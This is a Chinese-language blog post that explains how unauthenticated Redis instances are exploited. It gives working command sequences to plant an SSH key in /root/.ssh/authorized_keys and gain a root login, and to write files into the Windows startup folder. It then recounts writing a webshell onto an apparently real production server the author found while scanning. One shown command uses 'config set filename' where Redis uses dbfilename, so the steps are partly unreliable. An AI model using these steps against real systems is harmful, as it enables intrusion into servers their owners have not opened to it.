---
title:
  Redis未授权访问原理及利用
date:
  2023-07-07 10:51:45
tags:
  web
---

## 0x00 前言

最近终于挖到个有点意思的漏洞，比之前卵用没有的信息泄露好点。可惜因为是Windows Server，最后没搞到shell，不过也学到点东西吧。

Redis是最流行的非关系型即key-value数据库，通常用来做缓存。我之前写Java Web的时候，存储身份信息用的session和cookie，但据说用redis做token也可以。此外，如果查询数据量大，或者对并发要求高，也需要用redis做消息队列。

说起来比较有意思的是，我最早在面试安全社团的时候就遇到过redis未授权，但直到今天才搞明白。

## 0x01 漏洞描述

言归正传，导致漏洞的原因很简单：

> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行**写文件操作**，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

总结起来，产生条件有两点：

1. redis监听在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。

2. 未设置登陆密码

3. (可选)redis以root权限运行

产生危害：

>Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.

总之，如何存在redis未授权，有很大可能getshell，尤其在Linux下。

## 0x02 漏洞利用

#### 1. Linux写入SSH密钥getshell

SSH连接需要配置公钥私钥，这种配置也可以用来做免密SFTP文件传输，主要流程：

> 1、客户端生成RSA公钥和私钥
>
> 2、客户端将自己的公钥存放到服务器
>
> 3、客户端请求连接服务器，服务器将一个随机字符串发送给客户端
>
> 4、客户端根据自己的私钥加密这个随机字符串之后再发送给服务器
>
> 5、服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。

生成密钥需要用Linux下的ssh-keygen命令，Windows下用git bash也可以直接用，生成RSA公钥私钥对：

```bash
ssh-keygen -t rsa
```

[![pCcAaZD.png](https://s1.ax1x.com/2023/07/07/pCcAaZD.png)](https://imgse.com/i/pCcAaZD)

然后就是redis未授权的利用了，上面的描述可以看出来，这个漏洞的实质就是**通过redis提供的数据库持久化命令写文件**。因此将生成的公钥写入服务器，就能使用SSH连接getshell了。

先将生成公钥文件上传到redis数据库：

```bash
cat id_rsa.pub | redis-cli -h 192.168.1.16 -p 6379 -x set crack
OK
```

这行命令实际上是先用cat打印出文件中数据，然后利用管道符将数据重定向至redis-cli，并作为-x即设置key-value值的参数，**在数据库中插入key为crack，value为公钥文件数据的一行记录**：

[![pCc13Jf.png](https://s1.ax1x.com/2023/07/07/pCc13Jf.png)](https://imgse.com/i/pCc13Jf)

此时数据插入数据库，但只是在内存中，接下来**需要使用redis持久化命令写入文件**。

然后使用redis-cli连接redis数据库进入redis命令行：

```bash
redis-cli -h 192.168.1.16 -p 6379
192.168.1.16:6379>config set dir /root/.ssh
OK
```

此时切换环境变量***dir***(即数据库所在根目录)，设置为root密钥目录。

> 此外，这里切换目录时，如果目录不存在会报错，我感觉这里可以用目录扫描+redis的INFO命令中的redis根路径来猜出实际目录结构。

```bash
192.168.1.16:6379>config set dir /root/.ssh
OK
```

这里需要**权限**，我试了下自己装的docker里redis使用这条命令会报错dir是protected变量，不能修改。

然后修改环境变量数据库持久化文件名***dbfilename***:

```bash
192.168.1.16:6379>config set filename authorized_keys
OK
```

authorized_keys是SSH连接允许的公钥列表文件的默认文件名。

> 这里我也想到一点东西，如果当前数据库目录下已经存在同名文件会怎么样？应该是覆盖

最后保存即可连接成功：

```bash
192.168.1.16:6379>save
OK
ssh -i id_rsa root@192.168.1.16
root@192.168.1.16# whoami
root
```

当然还有很多其他操作，**crontab计划任务反弹shell**也是有意思的思路，其他详见[参考](https://blog.csdn.net/q20010619/article/details/121912003)。

#### 2. Windows写入自启动目录

上面的办法简单高效，但只适用于与Linux，如果是Windows server怎么办呢？

上面参考链接的crontab反弹shell给了一个思路，就是**利用启动项**。

和Linux不太相同，Windows的自启动有几类：系统服务、计划任务、注册表启动项、用户的startup目录。其中前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用。

startup的绝对路径如下：

`C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

虽然想知道用户名并不容易，但把常用的用户名挨个跑一遍，万一就成功了呢？*八成是Administrator*

[![pCctKeg.png](https://s1.ax1x.com/2023/07/07/pCctKeg.png)](https://imgse.com/i/pCctKeg)

然后等待服务器重启即可（虽然还是只能等，而且要赌一把服务器会重启）。

## 0x03 实际渗透

这次扫信息发布网，终于碰到了Redis未授权:

[![pCctNOU.png](https://s1.ax1x.com/2023/07/07/pCctNOU.png)](https://imgse.com/i/pCctNOU)

所以很容易就连上了Redis数据库，用INFO命令得到一些信息，但有用的只有config_file:

[![pCct6l6.png](https://s1.ax1x.com/2023/07/07/pCct6l6.png)](https://imgse.com/i/pCct6l6)

当然此时就可以随便对数据库增删改查了，果然是非常非常危险的漏洞。但很可惜是Windows server的服务器，所以大部分getshell的操作都用不来。

不过在对服务器仔细看了下，我发现用到了nginx中间件，那么能不能写入webshell呢？听起来有点搞头。

写webshell需要两个条件：

1. 知道nginx静态文件目录的路径

2. 知道这些文件对应的URL，并且能够正常访问

老实说，两个都不容易达到。但第一个可以通过config_file的路径猜下：

[![pCctTpt.png](https://s1.ax1x.com/2023/07/07/pCctTpt.png)](https://imgse.com/i/pCctTpt)

居然很容易就猜出来了！然后写入webshell一句话木马当然也没什么难度了。

这里我其实想到可以写一个类似于disearch这种目录扫描工具做实际路径猜测，路径是否存在回显非常明显嘛。

可惜麻烦的是第二步，扫了半天目录又猜了半天，还是没办法对应起来，主要是没见过这种比较复杂的静态网站的nginx目录结构。

但是猜到了`/nginx/conf`的路径，有没有可能用ngnix.conf覆盖本来的配置呢？我感觉这也是一种有意思的思路，可惜是生产环境没办法测试。
